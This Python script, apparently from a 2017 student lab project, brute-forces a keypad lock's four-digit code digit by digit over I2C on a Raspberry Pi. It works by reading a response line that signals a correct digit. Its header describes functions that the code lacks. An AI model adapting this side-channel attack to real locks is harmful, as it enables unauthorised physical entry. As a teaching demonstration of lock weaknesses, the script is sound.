#-------------------------------------------------------------------------------
# Name:        Side channel code
# Purpose:  This code runs the side chanel attack. It cycles through all the numbers and waits to see if there is a delay associated with the red led turning on
#           It needs sleeps so the lock code can run
#Functions:
#       checkingnum():
#           The function that runs through all the numbers and stores each correct digit. has to go back to one after each correct digit.
#           needs to
#       pulldown(index):
#           pulls down one of the three columns based on what index checkingnum has passed it. but first it makes sure the pi is activating the right row
#       next_red():
#           This function ets the program know when the red LED is on
# Author:      callum
#
# Created:     25/04/2017
# Copyright:   (c) callum 2017
# Licence:     <your licence>
#-------------------------------------------------------------------------------
import time
import smbus

BUS_ADDRESS = 1
LOCK_PICK_ADDRESS = 0b0111000
INPUT_MASK = 0x8f

DIGITS = ["1","2","3","4","5","6","7","8","9","*","0","#"]
# "digit": (row bit, column bit)
DIGIT_MAP = {"1":(0,0),"2":(0,1),"3":(0,2),
             "4":(1,0),"5":(1,1),"6":(1,2),
             "7":(2,0),"8":(2,1),"9":(2,2),
             "*":(3,0),"0":(3,1),"#":(3,2)}

def main():
    bus = smbus.SMBus(BUS_ADDRESS)
    find_code(bus)

def find_code(bus):
    code = []

    for i in range(4):
        found = False
        digit_index = 0
        while not found and digit_index<len(DIGITS):
            #send code so far
            print('sending existing code:' + str(code))
            for digit in code:
                send_digit(digit, bus)

            #test next digit
            digit = DIGITS[digit_index]
            print('testing digit' + str(digit))
            send_digit(digit, bus)

            resp = get_line(bus, 7)

            if resp:
                print('got it')
                code.append(digit)
                found = True
            else:
                print('try agian')
                digit_index += 1
    return code

def get_line(bus, bit):
    bus.write_byte(LOCK_PICK_ADDRESS, INPUT_MASK)
    time.sleep(0.1)
    inp = bus.read_byte(LOCK_PICK_ADDRESS)
    time.sleep(0.1)

    #return the value of the bit at position bit
    return inp & (1 << bit)

def send_digit(digit, bus):
    row_bit, column_bit = DIGIT_MAP[digit]
    #wait for line to go low
    while get_line(bus, row_bit) == 1:
        time.sleep(0.001)

    #shift by 4 and invert (as active low)
    column_code = ~(column_bit<<4)
    bus.write_byte(LOCK_PICK_ADDRESS, column_code)
    time.sleep(0.1)

if __name__ == "__main__":
    main()
